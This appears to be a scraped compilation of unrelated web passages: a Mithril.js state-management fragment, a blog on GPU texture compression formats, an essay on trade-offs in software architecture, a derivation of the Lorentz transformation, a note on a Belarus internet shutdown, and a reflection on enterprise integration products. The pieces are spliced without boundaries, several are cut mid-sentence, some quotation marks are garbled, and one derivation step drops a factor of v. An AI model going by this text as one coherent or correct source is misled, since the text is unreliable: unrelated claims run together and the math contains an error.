<p>(P.S. Credit goes to <a href="https://github.com/porsager">porsager</a> who shared this brilliant solution in the Mithril.js Gitter). <strong>This is my preferred approach to state management in Mithril.</strong> Passing your state and actions to child components would work as you'd expect. Simply pass your state and actions objects further down as <code>attrs</code>, or more wisely, be selective of what you choose to expose to child components.</p>
<p>Optional: you could also take an approach where your application is composed of solely stateless components. That is, every component is a pure, deterministic function. <a href="https://github.com/JorgeBucaran/hyperapp">Hyperapp</a> is a JavaScript framework that does not allow for local state in components. Instead, every component returns a portion of your UI that reflects the global state. While I highly recommend checking out Hyperapp (it's only 1kb gzipped!), this post is about Mithril, and you can use a similar approach with Mithril.</p>

		<p>Compressed texture formats is one of the esoteric aspects of graphics programming almost no one cares all that much about. Neither did I, however, I’ve recently taken an academic interest in the zoo of compressed texture formats.</p>
<p>During development in Granite, I occasionally find it useful to test scenes which target mobile on desktop and vice versa, and in Vulkan, where there are no fallback paths for unsupported compression formats, we gotta roll our own decompression.</p>
<p>While it really isn’t all that useful to write a decoder for these formats, my goal is to create a suite of reasonably understandable compute shader kernels which can decode all of the standard formats I care about. Of course, I could just use a Frankenstein decoder which merges together a lot of C reference decoders and call it a day, but that’s not aesthetically pleasing or interesting to me. By implementing these formats straight from the <a href="https://www.khronos.org/registry/DataFormat/">Khronos Data Format</a> specification, I learned a lot of things I would not otherwise know about these formats.</p>
<p>There are several major families of formats we can consider multi-vendor and standardized. Each of them fill their own niche. Unfortunately, desktop and mobile each have their own timelines with different texture compression standards, which is not fully resolved to this day in GPU hardware. (Basis Universal is something I will need to study eventually as well as it aims to solve this problem in software.)</p>
<p>By implementing all these formats, I got to see the evolution of block compression formats, see the major differences and design decisions that went into each format.</p>
<h3>The major format families</h3>
<p>First, it is useful to summarize all the families of texture compression I’ve looked at.</p>
<h4>S3TC / DXT</h4>
<p>The simplest family of formats. These formats are also known as the “BC” formats in Vulkan, or rather, BC 1, 2 and 3. This is the granddad of texture compression, similar to how I view MPEG1 in the video compression world.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs, probably for historical patent reasons.</p>
<h4>RGTC</h4>
<p>A very close relative of S3TC. These formats are very simple formats which specialize in encoding 1 and 2 uncorrelated channels, perfect for normal maps, metallic-roughness maps, etc. It is somewhat questionable to call these a separate family of formats (the Data Format specification separates them), since the basic format is basically exactly equal to the alpha format of S3TC, except that it extends the format to also support SNORM (-1, 1 range) alongside UNORM. These formats represent BC4 and BC5 in Vulkan.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs.</p>
<h4>ETC</h4>
<p>The ETC family of formats is very similarly laid out to S3TC in how different texture types are supported, but the implementation detail is quite different (and ETC2 is quite the interesting format). To support encoding full depth alpha and 1/2-component textures, there is the EAC format, which mirrors the RGTC formats.</p>
<p>These formats are firmly rooted in mobile GPUs. ETC1 was originally the only mandated format for OpenGLES 2.0 implementations, and ETC2 was mandated for OpenGLES 3.0 GPUs. It has almost no support on desktop GPUs. Intel iGPU is an exception here.</p>
<h4>BPTC</h4>
<p>This is where complexity starts to explode and where things get interesting. BC6 and BC7 are designed to compress high quality color images at 8bpp. BC6 adds support for HDR, which is to this day, one of only two ways to compress HDR images.</p>
<p>On desktop, BPTC is the state of the art in texture compression and was introduced around 2010.</p>
<h4>ASTC</h4>
<p>ASTC is the final boss of texture compression, and is the current state of the art in texture compression. Its complexity is staggering and aims to dominate the world with 128 bits. Mere mortals are not supposed to understand this format.</p>
<p>ASTC’s roots are on Mali GPUs, but it was always a Khronos standard, and is widely supported now on mobile Vulkan implementation (and Intel iGPU :3), at least the LDR profile. What you say, profiles in a texture compression format? Yes … yes, this is just the beginning of the madness that is ASTC.</p>
<h4>PVRTC?</h4>
<p>PVRTC is a PowerVR-exclusive format that has had some staying power due to iOS and I will likely ignore it in this series. However, it seems like a <strong>very different kind of format</strong> to all the others and studying it might be interesting. However, there is zero reason to use this format in Granite, and I don’t want to chew over too much.</p>
<h2>What is a texture compression format anyway?</h2>
<p>In a texture compression format, the specification describes a process for taking random bits given to it, and how to decode the bit-soup into texels. There are fundamental constraints in texture compression which is unique to this problem domain, and these restrictions heavily influence the design of the formats in question.</p>
<h4>Fixed block size</h4>
<p>To be able to randomly access any texel in a texture, there must be an O(1) mapping from texture coordinate to memory address. The only reasonable way to do this is to have a fixed block size. In all formats, 4×4 is the most common one. (As you can guess, ASTC can do odd-ball block sizes like 6×5).</p>
<p>Similarly, for reasons of random access, the number of bits spent per block must be constant. The typical block sizes are 64-bits and 128-bits, which is 4bpp and 8bpp respectively at 4×4 block size.</p>
<p>Image and video compression has none of these restrictions. That is a major reason why image and video compression is so much more efficient.</p>
<h4>A set of coding tools</h4>
<p>Each format has certain things it can do. The more complex the operations the format can do, the more expensive the decoding hardware becomes (and complex a software decoder becomes), so there’s always a challenge to balance complexity with quality per bit when standardizing a format. The most typical way to add coding tools is to be able to select between different modes of operation based on the content of the block, where each mode is suited to certain patterns of input. Use the right tool for the job! As we will see in this study, the number of coding tools will increase exponentially, and it starts to become impossible to make good use of all the tools given to you by the format.</p>
<p>Encoding becomes an optimization task where we aim to figure out the best coding tools to use among the ones given to us. In simpler formats, there are very few things to try, and approaching the optimal solution becomes straight forward, but as we get into the more esoteric formats, the real challenge is to prune dead ends early, since brute forcing our way through a near-infinite configuration space is not practical (but maybe it is with GPU encode? :3)</p>
<h2>Commonalities across formats</h2>
<p>Image compression and video compression uses the Discrete Cosine Transform (DCT) even to this day. This fundamental compression technique has been with us since the 80s and refuses to die. All the new compression formats just keep piling on complexity on top of more complexity, but in the center of it all, we find the DCT, or some equivalent of it.</p>
<p>Very similarly, texture compression achieves its compression through interpolation between two color values. Somehow, the formats all let us specify two <strong>endpoints</strong> which are constant over the 4×4 block and interpolation <strong>weights</strong>, which vary per pixel. Most of the innovation in the formats all comes down to how complicated and esoteric we can make the process of generating the endpoints and weights.</p>
<p>The weight values are typically expressed with very few bits of precision per texel (usually 2 or 3), and this is the main way we will keep bits spent per pixel down. This snippet is the core coding tool in all the formats I have studied:</p>
<pre>decoded_texel = mix(endpoint0, endpoint1, weight_between_0_and_1);</pre>
<h4>To correlate, or not to correlate?</h4>
<p>The endpoint model blends all components in lock-step. Typically the endpoint will be an RGB value. We call this correlated, because this interpolation will only work well if chrominance remains fairly constant with luminance being the only component which varies significantly. In uncorrelated input, say, RGB with an alpha mask, many formats let us express decorrelated inputs with two sets of weights.</p>
<pre>decoded_rgb = mix(endpoint0_rgb, endpoint1_rgb, rgb_weight);
decoded_alpha = mix(endpoint0_alpha, endpoint1_alpha, alpha_weight);</pre>
<p>This costs a lot more bits to encode since alpha_weight is very different from rgb_weight, but it should be worth it.</p>
<p>Many formats let us express if there is correlation or not. Correlation should always be exploited.</p>
<h4>Working around the horrible endpoint interpolation artifacts</h4>
<p>Almost all formats beyond the most trivial ones try really hard to come up with ways to work around the fact that endpoint interpolation leads to horrible results in all but the simplest input. The most common approach here is to split the block into partitions, where each partition has its own endpoints.</p>
<h2>S3TC – The basics</h2>
<p>A compute shader decoder:</p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp</a></p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h</a></p>
<h3>BC1 – 4×4 – 64 bits</h3>
<p>The BC1 format is extremely simple and a good starting point. 32 bits is used to encode two RGB endpoints in RGB565 format. The other 32 bits encode 16 weights, with 2 bits allocated to each texel.</p>
<p>This lets us represent interpolation weights of 0, 1/3, 2/3 and 1.</p>
<p>Since there is a symmetry in this design, i.e.:</p>
<pre>mix(a, b, l) == mix(b, a, 1.0 - l)</pre>
<p>there would be two ways to specify the same block, where we swap endpoints and invert the weights to compensate. This is an extra bit of information we can exploit. Based on the integer representation of the two endpoints, we can check if one of greater than the other, and use a different decoding mode based on that information. This exploitation of symmetry will pop up again in many formats later! In the secondary mode, we add support for 1-bit …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
    
<p>After completing the short <a href="https://ufried.com/blog/oss_1_rise_of_oss/">“OSS” blog series</a> series and before returning to the <a href="https://ufried.com/blog/simplify_1/">“Simplify!” blog series</a> that grew quite a lot while writing, I would like to discuss a completely different topic. I call it “the two first laws of architectural work”.</p>
<p>Of course, what I will describe are not actual laws. “Findings” or “lessons” (without the educational undertone) would be more accurate.</p>
<p>And even if they were laws, I do not know if they would be the first two ones. I just called them the first two ones to emphasize their relative importance. At least I find them very relevant as I see so many places where they are – often willfully – ignored which usually leads to negative consequences.</p>
<p>So, “Two IMO relevant findings regarding architectural work” would probably be a more accurate title. But that would not sound so impressive … ;)</p>
<p>Also, it would not express how important I think the two observations are. Therefore I will stick with the “two first laws”.</p>
<h2 id="the-first-law-of-architectural-work">The first law of architectural work</h2>
<p>The first law of architectural work, as I call it, is:</p>
<blockquote>
<p><strong>Every decision has its price. No decision is for free.</strong></p>
</blockquote>
<p>The longer version is:</p>
<blockquote>
<p>No decision only has upsides. Every decision also has downsides.</p>
</blockquote>
<p>I think that it is essential to understand that there is no free lunch in architectural work. Whenever you decide for an architectural option, you will get a mix of advantages and disadvantages. While in coding you sometimes have situations where one option is <em>right</em> and the others are <em>wrong</em>, you will never have such a situation in architectural work.</p>
<p>In architectural work, there is no “right” or “wrong”. There is only “better” or “worse”. I often tend to say, while in development things like “black” or “white”, 0 or 1 exist, in architecture only many shades of gray, the numbers between 0 and 1 exist. With every architectural decision you will get something, but you will also pay a price for it.</p>
<p>I am not sure if this pattern is as old as our industry, but especially in the recent years I noticed a growing tendency only to mention the potential advantages of a solution and hide the disadvantages.</p>
<p>I’ve seen too many talks talks, articles, posts, and alike, that just praise some concept, technology or method, “Do &lt;X&gt; and everything will be fine!” being the typical message. Downsides? Trade-offs? Nil return!</p>
<p>We could ignore those types of messages if they would not lead to really bad solutions in actual projects if project teams blindly pick up those messages. Two little examples:</p>
<p><strong>Microservices</strong></p>
<p>In the recent years, most IT projects went for microservices, often based on dubious rationales. But are microservices really “right” while the vilified monoliths are “wrong”?</p>
<p>If you take a neutral stance, you see that microservices can help you, e.g., with decoupling capability teams better, to implement some type of NFRs better and to upgrade technology easier. On the other hand they multiply operations complexity by orders of magnitude. And if you do not get your functional design right, availability and response times of the resulting application will badly suffer.</p>
<p>(Deployment) monoliths on the other side are the simplest type of application structure in operations. One executable, that’s it. Either it is up or down. Easy to monitor. Well-known and proven scaling patterns (replication and load balancers) if implemented correctly. On the other hand monoliths tend to become a big ball of mud, which is hard to maintain and leads to tight team coupling. Also technology upgrades become harder with the size of the application.</p>
<p>There would be a lot of details to add, but the message already becomes clear: It is not that one is “right” and the other is “wrong” (as many people try to suggest). Both have their strengths and weaknesses. Deciding for any one of the two gives you some advantages while it also gives you some disadvantages at the same time. And hiding the disadvantages does not make them go away.</p>
<p><strong>Event-based communication</strong></p>
<p>Event-based communication is another fashionable concept of the recent years and its advocates tend to talk down request-response-based communication.</p>
<p>Again, taking a neutral stance, you see that event-based communication, e.g., helps to decouple parts better on a technical level, the reversed dependency relation (receiver knows sender) can be advantageous, event brokers can even create location transparency, timeouts can be handled differently and more.</p>
<p>On the other hand event-based communication quickly creates complex communication patterns that are hard to understand, that can easily result in deadlocks and other unexpected behaviors, that can create a tight functional coupling between the parts if not designed very carefully, creates new challenges like dealing with lost or duplicate messages.</p>
<p>Request-response-based communication on the other side is easy to grasp as it resembles the call-stack pattern of communication flow that we are used to. It is very easy to implement and the system behavior tends to be a lot more deterministic and predictable as with event-based communication. On the other hand, blocking requests and latency – or timeouts if you monitor the call durations – either lead to undesired system behavior at runtime or quite some added complexity.</p>
<p>Again, while the discussion is not complete, the same message takes shape: It is not that one is “right” and the other is “wrong”. Both have their strengths and weaknesses.</p>
<p>I could a lot more examples, but these two little examples should be sufficient to illustrate what I mean with “Every decision has its price”.</p>
<p>If you are experienced in architectural work, this “law” should be obvious for you. Yet, I see a lot of people either willingly or unconsciously ignoring it. This becomes especially dangerous if “Agile” developer teams decide to make architectural work without anyone on the team having the required education and experience. Based on my observations, these teams tend to be very vulnerable to “Do &lt;X&gt; and everything will be fine!” messages. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>To wrap the first law up: The key to good architectural work is to find architectural decisions – or options if you prefer that term – that has more upsides than downsides.</p>
<p>This leaves the question, how to determine the up- and downsides of an option, which immediately leads to the second law.</p>
<h2 id="the-second-law-of-architectural-work">The second law of architectural work</h2>
<p>The second law of architectural work, as I call it, is:</p>
<blockquote>
<p><strong>A decision can only be evaluated with respect to its context.</strong></p>
</blockquote>
<p>The longer version is:</p>
<blockquote>
<p>Decisions are not invariably â€œgoodâ€� or â€œbadâ€�, but only with respect to a given context.</p>
</blockquote>
<p>This “law” is almost as important as the first one. I see too many decisions where advantages or disadvantages of concepts, technologies or methods are discussed without taking the actual context into account.</p>
<p>While there is nothing wrong to point out general trade-offs of an architectural option, it must be clear that they are never final but can only support the actual decision making process.</p>
<p>To illustrate that point, let us briefly revisit the microservices example from above. I sketched some advantages and disadvantages of microservices and monoliths. Which one to take (making the simplifying assumption here that those were the only options available)?</p>
<p>Well, it depends!</p>
<p>What is your context? You are a hyperscaler or live in a market where you need to move very fast with independent capability teams and we discuss customer-facing applications? Probably microservices will be the better option for you as the competitive advantages in terms of market responsiveness they give you will outweigh their disadvantages while for monoliths the opposite is true in the given context.</p>
<p>You are, e.g., an insurance company living in the highly regulated German market and we discuss an accounting solution? While microservices will give you basically no competitive advantages in such a setting, they offer grave disadvantages compared to a monolithic solution. So, very likely the monolith will be the better option.</p>
<p>You are a standard software manufacturer who sells solutions to clients who need to run the solutions (i.e., no SaaS solutions) and the operations teams of the client often do not have deep IT knowledge (a setting that you find quite often in SME-type companies). While on the development side microservices could give you a competitive advantage, your clients most likely would be hopelessly overstrained running a microservices solution.</p>
<p>As in the end the competitive advantage at deployment is not worth anything if your clients are not able to use your solutions, you will need to focus on providing the simplest possible solution from an operations point of view – which is a (deployment) monolith.</p>
<p>Additionally, a strict modularization concept at development time resulting in independent modules that are assembled together at build time could help you to realize parts of the competitive advantage that microservices would offer.</p>
<p>Again, while not complete these little examples should help to understand that one-size-fits-all solutions do not exist and the best option can vary heavily depending on the given context.</p>
<p>Architectural decisions are never â€œgoodâ€� or â€œbadâ€� per se, but only relative to a given context. Still, I see too many architectural discussions and recommendations being made in a vacuum, without taking the context into account.</p>
<h2 id="summing-up">Summing up</h2>
<p>These were my two “laws” of architectural work. Personally, I think it is essential to bear them in mind to be able to make good architectural work. Still, I see the opposite happening too often – at conferences, in articles, and also in actual project work, usually leading to bad decisions.</p>
<p>There would be a lot more to discuss in the context of the two laws, but I will leave it here. I hope I was able to bring the point across and would be glad if it contained some valuable ideas for you.</p>

      <h3 id="introduction">Introduction</h3>

<p>In my previous blog post <a href="https://leimao.github.io/blog/Special-Relativity/">“Special Relativity Explained”</a>, I have explained special relativity and its several key consequences based on the Lorentz transformation.</p>



<p>Since I did not give a derivation for Lorentz transformation last time, in this blog post, I would like to present the derivations in detail.</p>

<h3 id="postulates-of-special-relativity">Postulates of Special Relativity</h3>

<p>Lorentz transformation was derived based on the following two postulates only.</p>

<h4 id="first-postulate-principle-of-relativity">First Postulate (Principle of Relativity)</h4>

<p>The laws of physics take the same form in all inertial frames of reference.</p>

<h4 id="second-postulate-invariance-of-light-speed">Second Postulate (Invariance of Light Speed)</h4>

<p>As measured in any inertial frame of reference, light is always propagated in empty space with a definite velocity $c$ that is independent of the state of motion of the emitting body. It is also equivalent to say, the speed of light in free space has the same value $c$ in all inertial frames of reference.</p>

<h3 id="derivation">Derivation</h3>

<p>In the spacetime, we have two reference frames, a reference frame $S$ and another reference frame $S’$ moving at a velocity $v$ with respect to it. So the two reference frames in this scenario are inertial reference frame. The coordinate axes in each reference frame are parallel, i.e., the $x$ and $x’$ axes are parallel, the $y$ and $y’$ axes are parallel, and the $z$ and $z’$ axes are parallel, and remain mutually perpendicular. We assume the relative motion is along the coincident $xx’$ axes. At $t = t’ = 0$, the origins of both coordinate systems are the same, $(x,y,z) = (x’,y’,z’) = (0, 0, 0)$.</p>



<p>An event in the time space could be observed and recorded by the observers on the two reference frames using spacetime coordinates $(t,x,y,z)$ in the reference frame $S$ and $(t’,x’,y’,z’)$ in the reference frame $S’$, respectively.</p>



<p>We want to set up the mapping between $(t,x,y,z)$ and $(t’,x’,y’,z’)$ for the same event.</p>

<h4 id="lorentz-transformation-is-linear-transformation">Lorentz Transformation is Linear Transformation</h4>

<p>We propose the spacetime transformation from the reference frame $S$ to the reference frame $S’$ to have the following form.</p><p>

\[\begin{align}
t^{\prime} &amp;= f_t(x,t)\\
x^{\prime} &amp;= f_x(x,t)\\
y^{\prime} &amp;= y\\
z^{\prime} &amp;= z\\
\end{align}\]

</p><p>Note that we could eliminate the variables $y$ and $z$ in the functions $f_t$ and $f_x$ because of $y$ and $z$ are constants.</p>



<p>Now that we have proposed the form of transformation, there could be an infinite number of transformations that satisfied the form. What exactly the transformation is?</p>



<p>Suppose we have two events, one event has coordinates $(t_1,x_1,y_1,z_1)$ observed in the reference frame $S$ and coordinates $(t’_1,x’_1,y’_1,z’_1)$ observed in the reference frame $S’$, another one has coordinates $(t_2,x_2,y_2,z_2)$ observed in the reference frame $S$ and coordinates $(t’_2,x’_2,y’_2,z’_2)$ observed in the reference frame $S’$. Note that because reference frame $S’$ is moving along the $xx’$ axes, $y_1 = y’_1$, $z_1 = z’_1$, $y_2 = y’_2$, $z_2 = z’_2$.</p>



<p>Without loss of generality, we set $t_1 = t^{\prime}_1 = 0$, $x_1 = x^{\prime}_1 = 0$.</p><p>

\[\begin{align}
\Delta t &amp;= t_{2} - t_{1} = t_{2}\\
\Delta x &amp;= x_{2} - x_{1} = x_{2}\\
\Delta y &amp;= y_{2} - y_{1} = 0\\
\Delta z &amp;= z_{2} - z_{1} = 0\\
\end{align}\]

\[\begin{align}
\Delta t^{\prime} &amp;= t_{2}^{\prime} - t_{1}^{\prime} = t_{2}^{\prime}\\
\Delta x^{\prime} &amp;= x_{2}^{\prime} - x_{1}^{\prime} = x_{2}^{\prime}\\
\Delta y^{\prime} &amp;= y_{2}^{\prime} - y_{1}^{\prime} = 0\\
\Delta z^{\prime} &amp;= z_{2}^{\prime} - z_{1}^{\prime} = 0\\
\end{align}\]

</p><p>The two events, $(t_1,x_1,y_1,z_1)$ and $(t_2,x_2,y_2,z_2)$ observed in reference frame $S$, $(t’_1,x’_1,y’_1,z’_1)$ and $(t’_2,x’_2,y’_2,z’_2)$ observed in reference $S’$ have become equivalent to $(0,0,y_1,z_1)$ and $(\Delta t,\Delta x,y_2,z_2)$ observed in reference frame $S$, $(0,0,y’_1,z’_1)$ and $(\Delta t^{\prime},\Delta x^{\prime},y’_2,z’_2)$ observed in reference $S’$.</p>



<p>Based on the principle of relativity assumption, the transformation still holds. We have</p><p>

\[\begin{align}
0 &amp;= f_t(0,0)\\
0 &amp;= f_x(0,0)\\
y^{\prime} &amp;= y\\
z^{\prime} &amp;= z\\
\end{align}\]

</p><p>and</p><p>

\[\begin{align}
\Delta t^{\prime} &amp;= f_t(\Delta x, \Delta t)\\
\Delta x^{\prime} &amp;= f_x(\Delta x, \Delta t)\\
y^{\prime} &amp;= y\\
z^{\prime} &amp;= z\\
\end{align}\]

</p><p>This means the distances and time elapsed could also be transformed using the exact transformation for coordinates!</p>



<p>Ignoring uninteresting $y$ and $z$, we could equivalently write</p><p>

\[\begin{align}
\begin{bmatrix} 
    \Delta t^{\prime} \\
    \Delta x^{\prime} \\
\end{bmatrix}

&amp;=

\begin{bmatrix} 
    t_2^{\prime} - t_1^{\prime} \\
    x_2^{\prime} - x_1^{\prime} \\
\end{bmatrix}


=

\begin{bmatrix} 
    f_t(x_2,t_2) -  f_t(x_1,t_1)\\
    f_x(x_2,t_2) -  f_x(x_1,t_1)\\
\end{bmatrix}



=

\begin{bmatrix} 
    f_t(x_2,t_2)\\
    f_x(x_2,t_2)\\
\end{bmatrix}

-

\begin{bmatrix} 
    f_t(x_1,t_1)\\
    f_x(x_1,t_1)\\
\end{bmatrix}

\\

&amp;=

f \bigg(

\begin{bmatrix} 
    t_2 \\
    x_2 \\
\end{bmatrix}

\bigg)

-

f \bigg(

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg)

\end{align}\]

\[\begin{align}
\begin{bmatrix} 
    \Delta t^{\prime} \\
    \Delta x^{\prime} \\
\end{bmatrix}

&amp;=

\begin{bmatrix} 
    f_t(\Delta x, \Delta t) \\
    f_x(\Delta x, \Delta t) \\
\end{bmatrix}


=

f \bigg(

\begin{bmatrix} 
    \Delta t \\
    \Delta x \\
\end{bmatrix}

\bigg)

= 

f \bigg(

\begin{bmatrix} 
    t_2 - t_1 \\
    x_2 - x_1 \\
\end{bmatrix}

\bigg)

= 

f \bigg(

\begin{bmatrix} 
    t_2 \\
    x_2 \\
\end{bmatrix}

-

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg)


\end{align}\]

</p><p>We set a column vector $p = [t, x]^{\top}$ and this $p$ is a tensor in physics. It is also equivalent to write</p><p>

\[f(p_2) - f(p_1) = f(p_2 - p_1)\]

</p><p>This is also further equivalent to</p><p>

\[f(p_1) + f(p_2) = f(p_1 + p_2)\]

</p><p>In the next step, we would like to further show</p><p>

\[f(kp) = k f(p)\]

</p><p>Similarly suppose we have two events, one event has coordinates $(t_1,x_1,y_1,z_1)$ observed in the reference frame $S$ and coordinates $(t’_1,x’_1,y’_1,z’_1)$ observed in the reference frame $S’$, another one has coordinates $(t_2,x_2,y_2,z_2)$ observed in the reference frame $S$ and coordinates $(t’_2,x’_2,y’_2,z’_2)$ observed in the reference frame $S’$. In addition, in the reference frame it is observed that $t_2 = k t_1$ and $x_2 = k x_1$. Based on the principal of relativity assumption, $t’_2 = k t’_1$ and $x’_2 = k x’_1$.</p>



<p>Because</p><p>

\[\begin{align}
\begin{bmatrix} 
    t_1^{\prime} \\
    x_1^{\prime} \\
\end{bmatrix}

&amp;=

f \bigg(

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg) 
\end{align}\]

\[\begin{align}

\begin{bmatrix} 
    t_2^{\prime} \\
    x_2^{\prime} \\
\end{bmatrix}

&amp;=

f \bigg(

\begin{bmatrix} 
    t_2 \\
    x_2 \\
\end{bmatrix}


\bigg) 

= 

\begin{bmatrix} 
    k t_1^{\prime} \\
    k x_1^{\prime} \\
\end{bmatrix}


= 

k 
\begin{bmatrix} 
    t_1^{\prime} \\
    x_1^{\prime} \\
\end{bmatrix}

=
k
f \bigg(

\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}

\bigg)

\\

&amp;=

f \bigg(

\begin{bmatrix} 
    k t_1 \\
    k x_1 \\
\end{bmatrix}


\bigg) 

=

f \bigg(

k
\begin{bmatrix} 
    t_1 \\
    x_1 \\
\end{bmatrix}


\bigg) 



\end{align}\]

</p><p>Therefore,</p><p>

\[f(kp) = k f(p)\]

</p><p>Because we have shown that</p><p>

\[\begin{align}
f(p_1) + f(p_2) &amp;= f(p_1 + p_2) \\
f(kp) &amp;= k f(p)
\end{align}\]

</p><p>This is exactly the <a href="https://en.wikipedia.org/wiki/Linear_map#Definition_and_first_consequences">definition of a linear function</a> for function $f$ ($f_t$ and $f_x$), and note that this linear function $f$ has no bias term. Therefore, $f(p) = Mp$ for some matrix $M \in \mathbb{R}^{2 \times 2}$, and Lorentz transformation is a linear transformation.</p>

<h4 id="lorentz-transformation">Lorentz Transformation</h4>

<p>Because Lorentz transformation is a linear transformation, we could assume</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    x^{\prime} \\
\end{bmatrix} 

=

M
\begin{bmatrix} 
    t \\
    x \\
\end{bmatrix} 

=

\begin{bmatrix} 
    A &amp; B \\
    C &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    x \\
\end{bmatrix} 


=

\begin{bmatrix} 
    At + Bx \\
    Ct + Dx \\
\end{bmatrix} 


\end{align}\]

</p><p>Then the problem is very like the machine learning regression problem where we have to find the values for parameter $A$, $B$, $C$, and $D$. To solve this regression problem, we need some concrete data.</p>



<p>Because the reference frame $S’$ is moving at velocity $v$ with respect to the reference frame $S$. At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, we know $x = vt$ in the reference frame $S$ overlaps with the origin $x’ = 0$ in the reference frame $S’$. Note that $x = vt + 1$ in the reference frame $S$ does not necessary overlaps with $x’ = 1$ in the reference frame $S’$, although this is true in <a href="https://en.wikipedia.org/wiki/Galilean_transformation">Galilean transformations</a>.</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    0 \\
\end{bmatrix} 

=

\begin{bmatrix} 
    A &amp; B \\
    C &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    vt \\
\end{bmatrix} 

=


\begin{bmatrix} 
    At + Bvt \\
    Ct + Dvt \\
\end{bmatrix} 

\end{align}\]

</p><p>We found the relationships between $C$ and $D$.</p><p>

\[C = -Dv\]

</p><p>In addition, because the reference frame $S$ is moving at velocity $-v$ with respect to the reference frame $S’$. At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, we know $x = 0$ in the reference frame $S$ overlaps with the origin $x’ = -vt$ in the reference frame $S’$.</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    -v t^{\prime} \\
\end{bmatrix} 

=

\begin{bmatrix} 
    A &amp; B \\
    -Dv &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    0 \\
\end{bmatrix} 

=


\begin{bmatrix} 
    At \\
    -Dvt \\
\end{bmatrix} 

\end{align}\]

</p><p>We cancel the variable $t’$ and get</p><p>

\[-vAt = -Dvt\]

</p><p>So</p><p>

\[A = D\]

</p><p>This reduced the number of free parameters from four to two.</p><p>

\[\begin{align}
\begin{bmatrix} 
    t^{\prime} \\
    x^{\prime} \\
\end{bmatrix} 


=

\begin{bmatrix} 
    D &amp; B \\
    -Dv &amp; D \\
\end{bmatrix} 

\begin{bmatrix} 
    t \\
    x \\
\end{bmatrix} 


=

\begin{bmatrix} 
    Dt + Bx \\
    -Dt + Dx \\
\end{bmatrix} 


\end{align}\]

Prague-based <a href="https://blog.qrator.net/en/what-happening-BY_86/">Qrator Labs saw</a> the concurrent outage of 80% of IPv6 prefixes within Belarus, and inferred that filtering of downstream autonomous systems (AS) was taking place at the level of two upstream ASes that dominate international transit, AS6697 and AS60280. Official releases by the <a href="https://cert.by/?p=1722">National Center for Response to Computer Incidents</a>, the <a href="https://ncot.by/ru/news/news/o-vosstanovlenii-raboty-seti-internet/">National Traffic Exchange Center</a>, and <a href="https://beltelecom.by/news/main/vnimaniyu-abonentov-3">Beltelecom</a> stated the disruptions were the result of external cyberattacks and equipment failures.&nbsp;</span></span></p><p><span><span>Psiphon network performance and session quality remained at or above the regional average over the days of the shutdown.

        <p>How to publish a small file from a FTP location to a JMS queue? This was the problem statement given to me when I got my first job. As any new graduate would do, I thought of writing a fascinating, rocket science program using some programming language to get this done.</p>
<p>My new boss understood my blind enthusiasm and diverted me towards evaluating an enterprise integration product. In 2010, Open Source was just starting to boom in every technology layer of an enterprise, till then the biggest open source hit was Linux, then Android. For many, Open source was a new and scary concept.</p>
<p>I was particularly focusing on Open Source Integration Products, it was a new product category at that time. Some of today's popular enterprise integration vendors were laying their product and community foundation. Starting from Apache Camel with contributions from FuseSource(then acquired by RedHat) &amp; Talend, MuleSoft, WSO2, etc.</p>
<p>I played with pretty much all of these products and more, further I spent multiple years focusing on each of these products as I built my career around Enterprise Integration.</p>


<figure>

<h4>Integration Vs Custom Programming</h4>
</figcaption>
</figure>

<p>BTW, I was able to solve the FTP -&gt; JMS integration problem by writing a few lines of configurations (not program, just configurations), It was super easy. But I was living in guilt, spending 4 years in engineering and writing a two line Apache Camel code to move the file from FTP to JMS. You know what I mean ! (Just google my name along with any of these products, you will see a lot of related questions to the community,  Ignore all things naive, I was too young come on)</p>

<ul>
<li><strong>The number of applications were growing:</strong> Yes, enterprises built a lot of applications, as their business grew.
All these applications needed to talk with each other: Yes, that's how businesses were able to bring more value to customers.</li>
<li><strong>Developers were writing too much code.</strong> Yes, especially a lot of Java code with a lot of classes, with bugs, leading to performance issues and longer development cycles. (Yes, you can write 10 classes + 50 methods + completely unreadable code for the same FTP -&gt; JMS use case. )</li>
<li><strong>Too many point to point integrations</strong>, Developers built on-demand direct integrations between Applications. This led architects losing context on what is being built and what is connected to what.</li>
<li><strong>Too many integration points</strong> = too many protocols to deal with. Concept of adapters/connectors were treated like rocket science those days and It was super costly to build one yourself.</li>
</ul>

<p>I should actually call it - ‘More awareness in Enterprises to use Integration Products’. Yes, this happened in 2010.</p>
<p>Multiple communities and product vendors came up with products under the category of ‘Enterprise Integration’, converging a lot of ideologies like SOA, ESB’s, Middleware, MQ’s, Web Services, API’s, etc.</p>
<p>This actually improved the overall enterprise architecture in a lot of ways:</p>


<blockquote>
<p><strong>“Nothing lasts forever"</strong></p>
</blockquote>
<p>Today, The scope of Enterprise Integration technologies has shrunk in the end to end solution architecture. Integration Middleware worked, there is no flaw in the way it got evolved over the past decade. Particularly, Integration products streamlined the overall enterprise architecture in a lot of ways, <strong>unfortunately it was over architected without addressing the fundamental flaws in the underlying technologies/platforms.</strong></p>


<figure>
<img src="https://gnana.io/image/enterprise-integration-flaw.png">
<figcaption>
<h4>Enterprise Integration - Flaw</h4>
</figcaption>
</figure>

